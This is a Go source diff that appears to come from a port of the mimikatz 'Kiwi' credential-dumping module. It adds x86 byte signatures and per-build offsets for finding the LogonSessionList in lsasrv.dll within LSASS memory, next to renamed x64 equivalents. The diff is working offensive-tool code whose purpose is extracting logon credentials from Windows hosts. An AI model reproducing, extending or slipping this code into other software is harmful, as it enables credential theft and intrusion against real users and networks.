@@ -15,27 +15,8 @@ import (
 	"project/internal/module/windows/api"
 )
 
-type patchPattern struct {
-	length int
-	data   []byte
-}
-
-type patchOffsets struct {
-	off0 int
-	off1 int
-	off2 int
-	off3 int
-}
-
-type patchGeneric struct {
-	search  *patchPattern
-	patch   *patchPattern
-	offsets *patchOffsets
-}
-
-// x64
 var (
-	patternWin5X64LogonSessionList = []byte{
+	patternWin5xX64LogonSessionList = []byte{
 		0x4C, 0x8B, 0xDF, 0x49, 0xC1, 0xE3, 0x04, 0x48, 0x8B, 0xCB, 0x4C, 0x03, 0xD8,
 	}
 	patternWin60X64LogonSessionList = []byte{
@@ -60,16 +41,16 @@ var (
 	lsaSrvX64References = map[uint32]*patchGeneric{
 		buildWinXP: {
 			search: &patchPattern{
-				length: len(patternWin5X64LogonSessionList),
-				data:   patternWin5X64LogonSessionList,
+				length: len(patternWin5xX64LogonSessionList),
+				data:   patternWin5xX64LogonSessionList,
 			},
 			patch:   &patchPattern{length: 0, data: nil},
 			offsets: &patchOffsets{off0: -4, off1: 0},
 		},
 		buildWin2003: {
 			search: &patchPattern{
-				length: len(patternWin5X64LogonSessionList),
-				data:   patternWin5X64LogonSessionList,
+				length: len(patternWin5xX64LogonSessionList),
+				data:   patternWin5xX64LogonSessionList,
 			},
 			patch:   &patchPattern{length: 0, data: nil},
 			offsets: &patchOffsets{off0: -4, off1: -45},
@@ -141,7 +122,74 @@ var (
 	}
 )
 
-// x86
+var (
+	patternWin5xX86LogonSessionList = []byte{
+		0xFF, 0x50, 0x10, 0x85, 0xC0, 0x0F, 0x84,
+	}
+	patternWin7X86LogonSessionList = []byte{
+		0x89, 0x71, 0x04, 0x89, 0x30, 0x8D, 0x04, 0xBD,
+	}
+	patternWin80X86LogonSessionList = []byte{
+		0x8B, 0x45, 0xF8, 0x8B, 0x55, 0x08, 0x8B, 0xDE, 0x89, 0x02, 0x89, 0x5D, 0xF0, 0x85, 0xC9, 0x74,
+	}
+	patternWin81X86LogonSessionList = []byte{
+		0x8B, 0x4D, 0xE4, 0x8B, 0x45, 0xF4, 0x89, 0x75, 0xE8, 0x89, 0x01, 0x85, 0xFF, 0x74,
+	}
+	patternWin6xX86LogonSessionList = []byte{
+		0x8B, 0x4D, 0xE8, 0x8B, 0x45, 0xF4, 0x89, 0x75, 0xEC, 0x89, 0x01, 0x85, 0xFF, 0x74,
+	}
+	// key = build
+	lsaSrvX86References = map[uint32]*patchGeneric{
+		buildWinXP: {
+			search: &patchPattern{
+				length: len(patternWin5xX86LogonSessionList),
+				data:   patternWin5xX86LogonSessionList,
+			},
+			patch:   &patchPattern{length: 0, data: nil},
+			offsets: &patchOffsets{off0: 24, off1: 0},
+		},
+		buildWin2003: {
+			search: &patchPattern{
+				length: len(patternWin7X86LogonSessionList),
+				data:   patternWin7X86LogonSessionList,
+			},
+			patch:   &patchPattern{length: 0, data: nil},
+			offsets: &patchOffsets{off0: -11, off1: -43},
+		},
+		buildWinVista: {
+			search: &patchPattern{
+				length: len(patternWin7X86LogonSessionList),
+				data:   patternWin7X86LogonSessionList,
+			},
+			patch:   &patchPattern{length: 0, data: nil},
+			offsets: &patchOffsets{off0: -11, off1: -42},
+		},
+		buildWin8: {
+			search: &patchPattern{
+				length: len(patternWin80X86LogonSessionList),
+				data:   patternWin80X86LogonSessionList,
+			},
+			patch:   &patchPattern{length: 0, data: nil},
+			offsets: &patchOffsets{off0: 18, off1: -4},
+		},
+		buildWinBlue: {
+			search: &patchPattern{
+				length: len(patternWin81X86LogonSessionList),
+				data:   patternWin81X86LogonSessionList,
+			},
+			patch:   &patchPattern{length: 0, data: nil},
+			offsets: &patchOffsets{off0: 16, off1: -4},
+		},
+		buildWin10v1507: {
+			search: &patchPattern{
+				length: len(patternWin6xX86LogonSessionList),
+				data:   patternWin6xX86LogonSessionList,
+			},
+			patch:   &patchPattern{length: 0, data: nil},
+			offsets: &patchOffsets{off0: 16, off1: -4},
+		},
+	}
+)
 
 func (kiwi *Kiwi) searchLogonSessionListAddress(pHandle windows.Handle, patch *patchGeneric) error {
 	lsasrv, err := kiwi.getLSASSBasicModuleInfo(pHandle, "lsasrv.dll")
